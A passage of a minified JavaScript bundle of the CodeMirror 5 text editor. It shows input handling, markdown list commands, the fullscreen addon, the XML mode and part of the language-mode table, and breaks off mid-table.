D=za(i,p.line),I,W;if(D==s.view.length-1?(I=s.viewTo-1,W=s.lineDiv.lastChild):(I=wt(s.view[D+1].line)-1,W=s.view[D+1].node.previousSibling),!S)return!1;for(var K=i.doc.splitLines(WN(i,S,W,w,I)),ie=Fa(i.doc,ve(w,0),ve(I,Ye(i.doc,I).text.length));K.length>1&&ie.length>1;)if(it(K)==it(ie))K.pop(),ie.pop(),I--;else if(K[0]==ie[0])K.shift(),ie.shift(),w++;else break;for(var re=0,de=0,ge=K[0],ke=ie[0],Ie=Math.min(ge.length,ke.length);re<Ie&&ge.charCodeAt(re)==ke.charCodeAt(re);)++re;for(var Oe=it(K),Pe=it(ie),Me=Math.min(Oe.length-(K.length==1?re:0),Pe.length-(ie.length==1?re:0));de<Me&&Oe.charCodeAt(Oe.length-de-1)==Pe.charCodeAt(Pe.length-de-1);)++de;if(K.length==1&&ie.length==1&&w==c.line)for(;re&&re>c.ch&&Oe.charCodeAt(Oe.length-de-1)==Pe.charCodeAt(Pe.length-de-1);)re--,de++;K[K.length-1]=Oe.slice(0,Oe.length-de).replace(/^\u200b+/,""),K[0]=K[0].slice(re).replace(/\u200b+$/,"");var Qe=ve(w,re),Ge=ve(I,ie.length?it(ie).length-de:0);if(K.length>1||K[0]||Ze(Qe,Ge))return Os(i.doc,K,Qe,Ge,"+input"),!0},kt.prototype.ensurePolled=function(){this.forceCompositionEnd()},kt.prototype.reset=function(){this.forceCompositionEnd()},kt.prototype.forceCompositionEnd=function(){this.composing&&(clearTimeout(this.readDOMTimeout),this.composing=null,this.updateFromDOM(),this.div.blur(),this.div.focus())},kt.prototype.readFromDOMSoon=function(){var i=this;this.readDOMTimeout==null&&(this.readDOMTimeout=setTimeout(function(){if(i.readDOMTimeout=null,i.composing)if(i.composing.done)i.composing=null;else return;i.updateFromDOM()},80))},kt.prototype.updateFromDOM=function(){var i=this;(this.cm.isReadOnly()||!this.pollContent())&&tr(this.cm,function(){return qn(i.cm)})},kt.prototype.setUneditable=function(i){i.contentEditable="false"},kt.prototype.onKeyPress=function(i){i.charCode==0||this.composing||(i.preventDefault(),this.cm.isReadOnly()||cn(this.cm,vp)(this.cm,String.fromCharCode(i.charCode==null?i.keyCode:i.charCode),0))},kt.prototype.readOnlyChanged=function(i){this.div.contentEditable=String(i!="nocursor")},kt.prototype.onContextMenu=function(){},kt.prototype.resetPosition=function(){},kt.prototype.needsContentAttribute=!0;function Ay(i,s){var d=Uh(i,s.line);if(!d||d.hidden)return null;var c=Ye(i.doc,s.line),p=r1(d,c,s.line),y=Le(c,i.doc.direction),w="left";if(y){var S=Be(y,s.ch);w=S%2?"right":"left"}var D=s1(p.map,s.ch,w);return D.offset=D.collapse=="right"?D.end:D.start,D}function zN(i){for(var s=i;s;s=s.parentNode)if(/CodeMirror-gutter-wrapper/.test(s.className))return!0;return!1}function Us(i,s){return s&&(i.bad=!0),i}function WN(i,s,d,c,p){var y="",w=!1,S=i.doc.lineSeparator(),D=!1;function I(re){return function(de){return de.id==re}}function W(){w&&(y+=S,D&&(y+=S),w=D=!1)}function K(re){re&&(W(),y+=re)}function ie(re){if(re.nodeType==1){var de=re.getAttribute("cm-text");if(de){K(de);return}var ge=re.getAttribute("cm-marker"),ke;if(ge){var Ie=i.findMarks(ve(c,0),ve(p+1,0),I(+ge));Ie.length&&(ke=Ie[0].find(0))&&K(Fa(i.doc,ke.from,ke.to).join(S));return}if(re.getAttribute("contenteditable")=="false")return;var Oe=/^(pre|div|p|li|table|br)$/i.test(re.nodeName);if(!/^br$/i.test(re.nodeName)&&re.textContent.length==0)return;Oe&&W();for(var Pe=0;Pe<re.childNodes.length;Pe++)ie(re.childNodes[Pe]);/^(pre|p)$/i.test(re.nodeName)&&(D=!0),Oe&&(w=!0)}else re.nodeType==3&&K(re.nodeValue.replace(/\u200b/g,"").replace(/\u00a0/g," "))}for(;ie(s),s!=d;)s=s.nextSibling,D=!1;return y}function Hc(i,s,d){var c;if(s==i.display.lineDiv){if(c=i.display.lineDiv.childNodes[d],!c)return Us(i.clipPos(ve(i.display.viewTo-1)),!0);s=null,d=0}else for(c=s;;c=c.parentNode){if(!c||c==i.display.lineDiv)return null;if(c.parentNode&&c.parentNode==i.display.lineDiv)break}for(var p=0;p<i.display.view.length;p++){var y=i.display.view[p];if(y.node==c)return qN(y,s,d)}}function qN(i,s,d){var c=i.text.firstChild,p=!1;if(!s||!ae(c,s))return Us(ve(wt(i.line),0),!0);if(s==c&&(p=!0,s=c.childNodes[d],d=0,!s)){var y=i.rest?it(i.rest):i.line;return Us(ve(wt(y),y.text.length),p)}var w=s.nodeType==3?s:null,S=s;for(!w&&s.childNodes.length==1&&s.firstChild.nodeType==3&&(w=s.firstChild,d&&(d=w.nodeValue.length));S.parentNode!=c;)S=S.parentNode;var D=i.measure,I=D.maps;function W(ke,Ie,Oe){for(var Pe=-1;Pe<(I?I.length:0);Pe++)for(var Me=Pe<0?D.map:I[Pe],Qe=0;Qe<Me.length;Qe+=3){var Ge=Me[Qe+2];if(Ge==ke||Ge==Ie){var nt=wt(Pe<0?i.line:i.rest[Pe]),Nt=Me[Qe]+Oe;return(Oe<0||Ge!=ke)&&(Nt=Me[Qe+(Oe?1:0)]),ve(nt,Nt)}}}var K=W(w,S,d);if(K)return Us(K,p);for(var ie=S.nextSibling,re=w?w.nodeValue.length-d:0;ie;ie=ie.nextSibling){if(K=W(ie,ie.firstChild,0),K)return Us(ve(K.line,K.ch-re),p);re+=ie.textContent.length}for(var de=S.previousSibling,ge=d;de;de=de.previousSibling){if(K=W(de,de.firstChild,-1),K)return Us(ve(K.line,K.ch+ge),p);ge+=de.textContent.length}}var Qt=function(i){this.cm=i,this.prevInput="",this.pollingFast=!1,this.polling=new Tt,this.hasSelection=!1,this.composing=null,this.resetting=!1};Qt.prototype.init=function(i){var s=this,d=this,c=this.cm;this.createField(i);var p=this.textarea;i.wrapper.insertBefore(this.wrapper,i.wrapper.firstChild),T&&(p.style.width="0px"),fe(p,"input",function(){h&&m>=9&&s.hasSelection&&(s.hasSelection=null),d.poll()}),fe(p,"paste",function(w){tt(c,w)||ky(w,c)||(c.state.pasteIncoming=+new Date,d.fastPoll())});function y(w){if(!tt(c,w)){if(c.somethingSelected())Bc({lineWise:!1,text:c.getSelections()});else if(c.options.lineWiseCopyCut){var S=Cy(c);Bc({lineWise:!0,text:S.text}),w.type=="cut"?c.setSelections(S.ranges,null,nn):(d.prevInput="",p.value=S.text.join(`
`),Q(p))}else return;w.type=="cut"&&(c.state.cutIncoming=+new Date)}}fe(p,"cut",y),fe(p,"copy",y),fe(i.scroller,"paste",function(w){if(!(yi(i,w)||tt(c,w))){if(!p.dispatchEvent){c.state.pasteIncoming=+new Date,d.focus();return}var S=new Event("paste");S.clipboardData=w.clipboardData,p.dispatchEvent(S)}}),fe(i.lineSpace,"selectstart",function(w){yi(i,w)||Bt(w)}),fe(p,"compositionstart",function(){var w=c.getCursor("from");d.composing&&d.composing.range.clear(),d.composing={start:w,range:c.markText(w,c.getCursor("to"),{className:"CodeMirror-composing"})}}),fe(p,"compositionend",function(){d.composing&&(d.poll(),d.composing.range.clear(),d.composing=null)})},Qt.prototype.createField=function(i){this.wrapper=Sy(),this.textarea=this.wrapper.firstChild;var s=this.cm.options;bp(this.textarea,s.spellcheck,s.autocorrect,s.autocapitalize)},Qt.prototype.screenReaderLabelChanged=function(i){i?this.textarea.setAttribute("aria-label",i):this.textarea.removeAttribute("aria-label")},Qt.prototype.prepareSelection=function(){var i=this.cm,s=i.display,d=i.doc,c=x1(i);if(i.options.moveInputWithCursor){var p=Hr(i,d.sel.primary().head,"div"),y=s.wrapper.getBoundingClientRect(),w=s.lineDiv.getBoundingClientRect();c.teTop=Math.max(0,Math.min(s.wrapper.clientHeight-10,p.top+w.top-y.top)),c.teLeft=Math.max(0,Math.min(s.wrapper.clientWidth-10,p.left+w.left-y.left))}return c},Qt.prototype.showSelection=function(i){var s=this.cm,d=s.display;ye(d.cursorDiv,i.cursors),ye(d.selectionDiv,i.selection),i.teTop!=null&&(this.wrapper.style.top=i.teTop+"px",this.wrapper.style.left=i.teLeft+"px")},Qt.prototype.reset=function(i){if(!(this.contextMenuPending||this.composing&&i)){var s=this.cm;if(this.resetting=!0,s.somethingSelected()){this.prevInput="";var d=s.getSelection();this.textarea.value=d,s.state.focused&&Q(this.textarea),h&&m>=9&&(this.hasSelection=d)}else i||(this.prevInput=this.textarea.value="",h&&m>=9&&(this.hasSelection=null));this.resetting=!1}},Qt.prototype.getField=function(){return this.textarea},Qt.prototype.supportsTouch=function(){return!1},Qt.prototype.focus=function(){if(this.cm.options.readOnly!="nocursor"&&(!_||xe(Ve(this.textarea))!=this.textarea))try{this.textarea.focus()}catch{}},Qt.prototype.blur=function(){this.textarea.blur()},Qt.prototype.resetPosition=function(){this.wrapper.style.top=this.wrapper.style.left=0},Qt.prototype.receivedFocus=function(){this.slowPoll()},Qt.prototype.slowPoll=function(){var i=this;this.pollingFast||this.polling.set(this.cm.options.pollInterval,function(){i.poll(),i.cm.state.focused&&i.slowPoll()})},Qt.prototype.fastPoll=function(){var i=!1,s=this;s.pollingFast=!0;function d(){var c=s.poll();!c&&!i?(i=!0,s.polling.set(60,d)):(s.pollingFast=!1,s.slowPoll())}s.polling.set(20,d)},Qt.prototype.poll=function(){var i=this,s=this.cm,d=this.textarea,c=this.prevInput;if(this.contextMenuPending||this.resetting||!s.state.focused||WC(d)&&!c&&!this.composing||s.isReadOnly()||s.options.disableInput||s.state.keySeq)return!1;var p=d.value;if(p==c&&!s.somethingSelected())return!1;if(h&&m>=9&&this.hasSelection===p||M&&/[\uf700-\uf7ff]/.test(p))return s.display.input.reset(),!1;if(s.doc.sel==s.display.selForContextMenu){var y=p.charCodeAt(0);if(y==8203&&!c&&(c=""),y==8666)return this.reset(),this.cm.execCommand("undo")}for(var w=0,S=Math.min(c.length,p.length);w<S&&c.charCodeAt(w)==p.charCodeAt(w);)++w;return tr(s,function(){vp(s,p.slice(w),c.length-w,null,i.composing?"*compose":null),p.length>1e3||p.indexOf(`
`)>-1?d.value=i.prevInput="":i.prevInput=p,i.composing&&(i.composing.range.clear(),i.composing.range=s.markText(i.composing.start,s.getCursor("to"),{className:"CodeMirror-composing"}))}),!0},Qt.prototype.ensurePolled=function(){this.pollingFast&&this.poll()&&(this.pollingFast=!1)},Qt.prototype.onKeyPress=function(){h&&m>=9&&(this.hasSelection=null),this.fastPoll()},Qt.prototype.onContextMenu=function(i){var s=this,d=s.cm,c=d.display,p=s.textarea;s.contextMenuPending&&s.contextMenuPending();var y=Ua(d,i),w=c.scroller.scrollTop;if(!y||C)return;var S=d.options.resetSelectionOnContextMenu;S&&d.doc.sel.contains(y)==-1&&cn(d,Cn)(d.doc,Gi(y),nn);var D=p.style.cssText,I=s.wrapper.style.cssText,W=s.wrapper.offsetParent.getBoundingClientRect();s.wrapper.style.cssText="position: static",p.style.cssText=`position: absolute; width: 30px; height: 30px;
      top: `+(i.clientY-W.top-5)+"px; left: "+(i.clientX-W.left-5)+`px;
      z-index: 1000; background: `+(h?"rgba(255, 255, 255, .05)":"transparent")+`;
      outline: none; border-width: 0; outline: none; overflow: hidden; opacity: .05; filter: alpha(opacity=5);`;var K;x&&(K=p.ownerDocument.defaultView.scrollY),c.input.focus(),x&&p.ownerDocument.defaultView.scrollTo(null,K),c.input.reset(),d.somethingSelected()||(p.value=s.prevInput=" "),s.contextMenuPending=re,c.selForContextMenu=d.doc.sel,clearTimeout(c.detectingSelectAll);function ie(){if(p.selectionStart!=null){var ge=d.somethingSelected(),ke=""+(ge?p.value:"");p.value="",p.value=ke,s.prevInput=ge?"":"",p.selectionStart=1,p.selectionEnd=ke.length,c.selForContextMenu=d.doc.sel}}function re(){if(s.contextMenuPending==re&&(s.contextMenuPending=!1,s.wrapper.style.cssText=I,p.style.cssText=D,h&&m<9&&c.scrollbars.setScrollTop(c.scroller.scrollTop=w),p.selectionStart!=null)){(!h||h&&m<9)&&ie();var ge=0,ke=function(){c.selForContextMenu==d.doc.sel&&p.selectionStart==0&&p.selectionEnd>0&&s.prevInput==""?cn(d,V1)(d):ge++<10?c.detectingSelectAll=setTimeout(ke,500):(c.selForContextMenu=null,c.input.reset())};c.detectingSelectAll=setTimeout(ke,200)}}if(h&&m>=9&&ie(),Y){Mr(i);var de=function(){gt(window,"mouseup",de),setTimeout(re,20)};fe(window,"mouseup",de)}else setTimeout(re,50)},Qt.prototype.readOnlyChanged=function(i){i||this.reset(),this.textarea.disabled=i=="nocursor",this.textarea.readOnly=!!i},Qt.prototype.setUneditable=function(){},Qt.prototype.needsContentAttribute=!1;function $N(i,s){if(s=s?vt(s):{},s.value=i.value,!s.tabindex&&i.tabIndex&&(s.tabindex=i.tabIndex),!s.placeholder&&i.placeholder&&(s.placeholder=i.placeholder),s.autofocus==null){var d=xe(Ve(i));s.autofocus=d==i||i.getAttribute("autofocus")!=null&&d==document.body}function c(){i.value=S.getValue()}var p;if(i.form&&(fe(i.form,"submit",c),!s.leaveSubmitMethodAlone)){var y=i.form;p=y.submit;try{var w=y.submit=function(){c(),y.submit=p,y.submit(),y.submit=w}}catch{}}s.finishInit=function(D){D.save=c,D.getTextArea=function(){return i},D.toTextArea=function(){D.toTextArea=isNaN,c(),i.parentNode.removeChild(D.getWrapperElement()),i.style.display="",i.form&&(gt(i.form,"submit",c),!s.leaveSubmitMethodAlone&&typeof i.form.submit=="function"&&(i.form.submit=p))}},i.style.display="none";var S=Pt(function(D){return i.parentNode.insertBefore(D,i.nextSibling)},s);return S}function YN(i){i.off=gt,i.on=fe,i.wheelEventPixels=JS,i.Doc=$n,i.splitLines=wh,i.countColumn=lt,i.findColumn=Un,i.isWordChar=H,i.Pass=Mt,i.signal=xt,i.Line=Cs,i.changeEnd=Qi,i.scrollbarModel=k1,i.Pos=ve,i.cmpPos=Ze,i.modes=Th,i.mimeModes=ks,i.resolveMode=uc,i.getMode=Ch,i.modeExtensions=Ts,i.extendMode=GC,i.copyState=Oa,i.startState=Dx,i.innerMode=Sh,i.commands=vo,i.keyMap=bi,i.keyName=uy,i.isModifierKey=ly,i.lookupKey=Ms,i.normalizeKeyMap=EN,i.StringStream=Xt,i.SharedTextMarker=go,i.TextMarker=Xi,i.LineWidget=mo,i.e_preventDefault=Bt,i.e_stopPropagation=pi,i.e_stop=Mr,i.addClass=q,i.contains=ae,i.rmClass=Z,i.keyNames=Zi}FN(Pt),UN(Pt);var VN="iter insert remove copy getEditor constructor".split(" ");for(var Uc in $n.prototype)$n.prototype.hasOwnProperty(Uc)&&ut(VN,Uc)<0&&(Pt.prototype[Uc]=function(i){return function(){return i.apply(this.doc,arguments)}}($n.prototype[Uc]));return Cr($n),Pt.inputStyles={textarea:Qt,contenteditable:kt},Pt.defineMode=function(i){!Pt.defaults.mode&&i!="null"&&(Pt.defaults.mode=i),YC.apply(this,arguments)},Pt.defineMIME=VC,Pt.defineMode("null",function(){return{token:function(i){return i.skipToEnd()}}}),Pt.defineMIME("text/plain","null"),Pt.defineExtension=function(i,s){Pt.prototype[i]=s},Pt.defineDocExtension=function(i,s){$n.prototype[i]=s},Pt.fromTextArea=$N,YN(Pt),Pt.version="5.65.20",Pt})})(kk);var kr=kk.exports;(function(e,t){(function(n){n(kr)})(function(n){var r=/^(\s*)(>[> ]*|[*+-] \[[x ]\]\s|[*+-]\s|(\d+)([.)]))(\s*)/,a=/^(\s*)(>[> ]*|[*+-] \[[x ]\]|[*+-]|(\d+)[.)])(\s*)$/,l=/[*+-]\s/;n.commands.newlineAndIndentContinueMarkdownList=function(f){if(f.getOption("disableInput"))return n.Pass;for(var h=f.listSelections(),m=[],x=0;x<h.length;x++){var g=h[x].head,b=f.getStateAfter(g.line),E=n.innerMode(f.getMode(),b);if(E.mode.name!=="markdown"&&E.mode.helperType!=="markdown"){f.execCommand("newlineAndIndent");return}else b=E.state;var C=b.list!==!1,P=b.quote!==0,O=f.getLine(g.line),N=r.exec(O),T=/^\s*$/.test(O.slice(0,g.ch));if(!h[x].empty()||!C&&!P||!N||T){f.execCommand("newlineAndIndent");return}if(a.test(O)){var A=P&&/>\s*$/.test(O),_=!/>\s*$/.test(O);(A||_)&&f.replaceRange("",{line:g.line,ch:0},{line:g.line,ch:g.ch+1}),m[x]=`
`}else{var M=N[1],R=N[5],B=!(l.test(N[2])||N[2].indexOf(">")>=0),U=B?parseInt(N[3],10)+1+N[4]:N[2].replace("x"," ");m[x]=`
`+M+U+R,B&&u(f,g)}}f.replaceSelections(m)};function u(f,h){var m=h.line,x=0,g=0,b=r.exec(f.getLine(m)),E=b[1];do{x+=1;var C=m+x,P=f.getLine(C),O=r.exec(P);if(O){var N=O[1],T=parseInt(b[3],10)+x-g,A=parseInt(O[3],10),_=A;if(E===N&&!isNaN(A))T===A&&(_=A+1),T>A&&(_=T+1),f.replaceRange(P.replace(r,N+_+O[4]+O[5]),{line:C,ch:0},{line:C,ch:P.length});else{if(E.length>N.length||E.length<N.length&&x===1)return;g+=1}}}while(O)}})})();var Tk=kr;Tk.commands.tabAndIndentMarkdownList=function(e){var t=e.listSelections(),n=t[0].head,r=e.getStateAfter(n.line),a=r.list!==!1;if(a){e.execCommand("indentMore");return}if(e.options.indentWithTabs)e.execCommand("insertTab");else{var l=Array(e.options.tabSize+1).join(" ");e.replaceSelection(l)}};Tk.commands.shiftTabAndUnindentMarkdownList=function(e){var t=e.listSelections(),n=t[0].head,r=e.getStateAfter(n.line),a=r.list!==!1;if(a){e.execCommand("indentLess");return}if(e.options.indentWithTabs)e.execCommand("insertTab");else{var l=Array(e.options.tabSize+1).join(" ");e.replaceSelection(l)}};(function(e,t){(function(n){n(kr)})(function(n){n.defineOption("fullScreen",!1,function(l,u,f){f==n.Init&&(f=!1),!f!=!u&&(u?r(l):a(l))});function r(l){var u=l.getWrapperElement();l.state.fullScreenRestore={scrollTop:window.pageYOffset,scrollLeft:window.pageXOffset,width:u.style.width,height:u.style.height},u.style.width="",u.style.height="auto",u.className+=" CodeMirror-fullscreen",document.documentElement.style.overflow="hidden",l.refresh()}function a(l){var u=l.getWrapperElement();u.className=u.className.replace(/\s*CodeMirror-fullscreen\b/,""),document.documentElement.style.overflow="";var f=l.state.fullScreenRestore;u.style.width=f.width,u.style.height=f.height,window.scrollTo(f.scrollLeft,f.scrollTop),l.refresh()}})})();var B_={exports:{}},H_={exports:{}};(function(e,t){(function(n){n(kr)})(function(n){var r={autoSelfClosers:{area:!0,base:!0,br:!0,col:!0,command:!0,embed:!0,frame:!0,hr:!0,img:!0,input:!0,keygen:!0,link:!0,meta:!0,param:!0,source:!0,track:!0,wbr:!0,menuitem:!0},implicitlyClosed:{dd:!0,li:!0,optgroup:!0,option:!0,p:!0,rp:!0,rt:!0,tbody:!0,td:!0,tfoot:!0,th:!0,tr:!0},contextGrabbers:{dd:{dd:!0,dt:!0},dt:{dd:!0,dt:!0},li:{li:!0},option:{option:!0,optgroup:!0},optgroup:{optgroup:!0},p:{address:!0,article:!0,aside:!0,blockquote:!0,dir:!0,div:!0,dl:!0,fieldset:!0,footer:!0,form:!0,h1:!0,h2:!0,h3:!0,h4:!0,h5:!0,h6:!0,header:!0,hgroup:!0,hr:!0,menu:!0,nav:!0,ol:!0,p:!0,pre:!0,section:!0,table:!0,ul:!0},rp:{rp:!0,rt:!0},rt:{rp:!0,rt:!0},tbody:{tbody:!0,tfoot:!0},td:{td:!0,th:!0},tfoot:{tbody:!0},th:{td:!0,th:!0},thead:{tbody:!0,tfoot:!0},tr:{tr:!0}},doNotIndent:{pre:!0},allowUnquoted:!0,allowMissing:!0,caseFold:!0},a={autoSelfClosers:{},implicitlyClosed:{},contextGrabbers:{},doNotIndent:{},allowUnquoted:!1,allowMissing:!1,allowMissingTagName:!1,caseFold:!1};n.defineMode("xml",function(l,u){var f=l.indentUnit,h={},m=u.htmlMode?r:a;for(var x in m)h[x]=m[x];for(var x in u)h[x]=u[x];var g,b;function E(J,pe){function oe(q){return pe.tokenize=q,q(J,pe)}var ae=J.next();if(ae=="<")return J.eat("!")?J.eat("[")?J.match("CDATA[")?oe(O("atom","]]>")):null:J.match("--")?oe(O("comment","-->")):J.match("DOCTYPE",!0,!0)?(J.eatWhile(/[\w\._\-]/),oe(N(1))):null:J.eat("?")?(J.eatWhile(/[\w\._\-]/),pe.tokenize=O("meta","?>"),"meta"):(g=J.eat("/")?"closeTag":"openTag",pe.tokenize=C,"tag bracket");if(ae=="&"){var xe;return J.eat("#")?J.eat("x")?xe=J.eatWhile(/[a-fA-F\d]/)&&J.eat(";"):xe=J.eatWhile(/[\d]/)&&J.eat(";"):xe=J.eatWhile(/[\w\.\-:]/)&&J.eat(";"),xe?"atom":"error"}else return J.eatWhile(/[^&<]/),null}E.isInText=!0;function C(J,pe){var oe=J.next();if(oe==">"||oe=="/"&&J.eat(">"))return pe.tokenize=E,g=oe==">"?"endTag":"selfcloseTag","tag bracket";if(oe=="=")return g="equals",null;if(oe=="<"){pe.tokenize=E,pe.state=R,pe.tagName=pe.tagStart=null;var ae=pe.tokenize(J,pe);return ae?ae+" tag error":"tag error"}else return/[\'\"]/.test(oe)?(pe.tokenize=P(oe),pe.stringStartCol=J.column(),pe.tokenize(J,pe)):(J.match(/^[^\s\u00a0=<>\"\']*[^\s\u00a0=<>\"\'\/]/),"word")}function P(J){var pe=function(oe,ae){for(;!oe.eol();)if(oe.next()==J){ae.tokenize=C;break}return"string"};return pe.isInAttribute=!0,pe}function O(J,pe){return function(oe,ae){for(;!oe.eol();){if(oe.match(pe)){ae.tokenize=E;break}oe.next()}return J}}function N(J){return function(pe,oe){for(var ae;(ae=pe.next())!=null;){if(ae=="<")return oe.tokenize=N(J+1),oe.tokenize(pe,oe);if(ae==">")if(J==1){oe.tokenize=E;break}else return oe.tokenize=N(J-1),oe.tokenize(pe,oe)}return"meta"}}function T(J){return J&&J.toLowerCase()}function A(J,pe,oe){this.prev=J.context,this.tagName=pe||"",this.indent=J.indented,this.startOfLine=oe,(h.doNotIndent.hasOwnProperty(pe)||J.context&&J.context.noIndent)&&(this.noIndent=!0)}function _(J){J.context&&(J.context=J.context.prev)}function M(J,pe){for(var oe;;){if(!J.context||(oe=J.context.tagName,!h.contextGrabbers.hasOwnProperty(T(oe))||!h.contextGrabbers[T(oe)].hasOwnProperty(T(pe))))return;_(J)}}function R(J,pe,oe){return J=="openTag"?(oe.tagStart=pe.column(),B):J=="closeTag"?U:R}function B(J,pe,oe){return J=="word"?(oe.tagName=pe.current(),b="tag",ne):h.allowMissingTagName&&J=="endTag"?(b="tag bracket",ne(J,pe,oe)):(b="error",B)}function U(J,pe,oe){if(J=="word"){var ae=pe.current();return oe.context&&oe.context.tagName!=ae&&h.implicitlyClosed.hasOwnProperty(T(oe.context.tagName))&&_(oe),oe.context&&oe.context.tagName==ae||h.matchClosing===!1?(b="tag",$):(b="tag error",Y)}else return h.allowMissingTagName&&J=="endTag"?(b="tag bracket",$(J,pe,oe)):(b="error",Y)}function $(J,pe,oe){return J!="endTag"?(b="error",$):(_(oe),R)}function Y(J,pe,oe){return b="error",$(J,pe,oe)}function ne(J,pe,oe){if(J=="word")return b="attribute",Z;if(J=="endTag"||J=="selfcloseTag"){var ae=oe.tagName,xe=oe.tagStart;return oe.tagName=oe.tagStart=null,J=="selfcloseTag"||h.autoSelfClosers.hasOwnProperty(T(ae))?M(oe,ae):(M(oe,ae),oe.context=new A(oe,ae,xe==oe.indented)),R}return b="error",ne}function Z(J,pe,oe){return J=="equals"?me:(h.allowMissing||(b="error"),ne(J,pe,oe))}function me(J,pe,oe){return J=="string"?ye:J=="word"&&h.allowUnquoted?(b="string",ne):(b="error",ne(J,pe,oe))}function ye(J,pe,oe){return J=="string"?ye:ne(J,pe,oe)}return{startState:function(J){var pe={tokenize:E,state:R,indented:J||0,tagName:null,tagStart:null,context:null};return J!=null&&(pe.baseIndent=J),pe},token:function(J,pe){if(!pe.tagName&&J.sol()&&(pe.indented=J.indentation()),J.eatSpace())return null;g=null;var oe=pe.tokenize(J,pe);return(oe||g)&&oe!="comment"&&(b=null,pe.state=pe.state(g||oe,J,pe),b&&(oe=b=="error"?oe+" error":b)),oe},indent:function(J,pe,oe){var ae=J.context;if(J.tokenize.isInAttribute)return J.tagStart==J.indented?J.stringStartCol+1:J.indented+f;if(ae&&ae.noIndent)return n.Pass;if(J.tokenize!=C&&J.tokenize!=E)return oe?oe.match(/^(\s*)/)[0].length:0;if(J.tagName)return h.multilineTagIndentPastTag!==!1?J.tagStart+J.tagName.length+2:J.tagStart+f*(h.multilineTagIndentFactor||1);if(h.alignCDATA&&/<!\[CDATA\[/.test(pe))return 0;var xe=pe&&/^<(\/)?([\w_:\.-]*)/.exec(pe);if(xe&&xe[1])for(;ae;)if(ae.tagName==xe[2]){ae=ae.prev;break}else if(h.implicitlyClosed.hasOwnProperty(T(ae.tagName)))ae=ae.prev;else break;else if(xe)for(;ae;){var q=h.contextGrabbers[T(ae.tagName)];if(q&&q.hasOwnProperty(T(xe[2])))ae=ae.prev;else break}for(;ae&&ae.prev&&!ae.startOfLine;)ae=ae.prev;return ae?ae.indent+f:J.baseIndent||0},electricInput:/<\/[\s\w:]+>$/,blockCommentStart:"<!--",blockCommentEnd:"-->",configuration:h.htmlMode?"html":"xml",helperType:h.htmlMode?"html":"xml",skipAttribute:function(J){J.state==me&&(J.state=ne)},xmlCurrentTag:function(J){return J.tagName?{name:J.tagName,close:J.type=="closeTag"}:null},xmlCurrentContext:function(J){for(var pe=[],oe=J.context;oe;oe=oe.prev)pe.push(oe.tagName);return pe.reverse()}}}),n.defineMIME("text/xml","xml"),n.defineMIME("application/xml","xml"),n.mimeModes.hasOwnProperty("text/html")||n.defineMIME("text/html",{name:"xml",htmlMode:!0})})})();var U_=H_.exports,nb={exports:{}},rb;function z_(){return rb||(rb=1,function(e,t){(function(n){n(kr)})(function(n){n.modeInfo=[{name:"APL",mime:"text/apl",mode:"apl",ext:["dyalog","apl"]},{name:"PGP",mimes:["application/pgp","application/pgp-encrypted","application/pgp-keys","application/pgp-signature"],mode:"asciiarmor",ext:["asc","pgp","sig"]},{name:"ASN.1",mime:"text/x-ttcn-asn",mode:"asn.1",ext:["asn","asn1"]},{name:"Asterisk",mime:"text/x-asterisk",mode:"asterisk",file:/^extensions\.conf$/i},{name:"Brainfuck",mime:"text/x-brainfuck",mode:"brainfuck",ext:["b","bf"]},{name:"C",mime:"text/x-csrc",mode:"clike",ext:["c","h","ino"]},{name:"C++",mime:"text/x-c++src",mode:"clike",ext:["cpp","c++","cc","cxx","hpp","h++","hh","hxx"],alias:["cpp"]},{name:"Cobol",mime:"text/x-cobol",mode:"cobol",ext:["cob","cpy","cbl"]},{name:"C#",mime:"text/x-csharp",mode:"clike",ext:["cs"],alias:["csharp","cs"]},{name:"Clojure",mime:"text/x-clojure",mode:"clojure",ext:["clj","cljc","cljx"]},{name:"ClojureScript",mime:"text/x-clojurescript",mode:"clojure",ext:["cljs"]},{name:"Closure Stylesheets (GSS)",mime:"text/x-gss",mode:"css",ext:["gss"]},{name:"CMake",mime:"text/x-cmake",mode:"cmake",ext:["cmake","cmake.in"],file:/^CMakeLists\.txt$/},{name:"CoffeeScript",mimes:["application/vnd.coffeescript","text/coffeescript","text/x-coffeescript"],mode:"coffeescript",ext:["coffee"],alias:["coffee","coffee-script"]},{name:"Common Lisp",mime:"text/x-common-lisp",mode:"commonlisp",ext:["cl","lisp","el"],alias:["lisp"]},{name:"Cypher",mime:"application/x-cypher-query",mode:"cypher",ext:["cyp","cypher"]},{name:"Cython",mime:"text/x-cython",mode:"python",ext:["pyx","pxd","pxi"]},{name:"Crystal",mime:"text/x-crystal",mode:"crystal",ext:["cr"]},{name:"CSS",mime:"text/css",mode:"css",ext:["css"]},{name:"CQL",mime:"text/x-cassandra",mode:"sql",ext:["cql"]},{name:"D",mime:"text/x-d",mode:"d",ext:["d"]},{name:"Dart",mimes:["application/dart","text/x-dart"],mode:"dart",ext:["dart"]},{name:"diff",mime:"text/x-diff",mode:"diff",ext:["diff","patch"]},{name:"Django",mime:"text/x-django",mode:"django"},{name:"Dockerfile",mime:"text/x-dockerfile",mode:"dockerfile",file:/^Dockerfile$/},{name:"DTD",mime:"application/xml-dtd",mode:"dtd",ext:["dtd"]},{name:"Dylan",mime:"text/x-dylan",mode:"dylan",ext:["dylan","dyl","intr"]},{name:"EBNF",mime:"text/x-ebnf",mode:"ebnf"},{name:"ECL",mime:"text/x-ecl",mode:"ecl",ext:["ecl"]},{name:"edn",mime:"application/edn",mode:"clojure",ext:["edn"]},{name:"Eiffel",mime:"text/x-eiffel",mode:"eiffel",ext:["e"]},{name:"Elm",mime:"text/x-elm",mode:"elm",ext:["elm"]},{name:"Embedded JavaScript",mime:"application/x-ejs",mode:"htmlembedded",ext:["ejs"]},{name:"Embedded Ruby",mime:"application/x-erb",mode:"htmlembedded",ext:["erb"]},{name:"Erlang",mime:"text/x-erlang",mode:"erlang",ext:["erl"]},{name:"Esper",mime:"text/x-esper",mode:"sql"},{name:"Factor",mime:"text/x-factor",mode:"factor",ext:["factor"]},{name:"FCL",mime:"text/x-fcl",mode:"fcl"},{name:"Forth",mime:"text/x-forth",mode:"forth",ext:["forth","fth","4th"]},{name:"Fortran",mime:"text/x-fortran",mode:"fortran",ext:["f","for","f77","f90","f95"]},{name:"F#",mime:"text/x-fsharp",mode:"mllike",ext:["fs"],alias:["fsharp"]},{name:"Gas",mime:"text/x-gas",mode:"gas",ext:["s"]},{name:"Gherkin",mime:"text/x-feature",mode:"gherkin",ext:["feature"]},{name:"GitHub Flavored 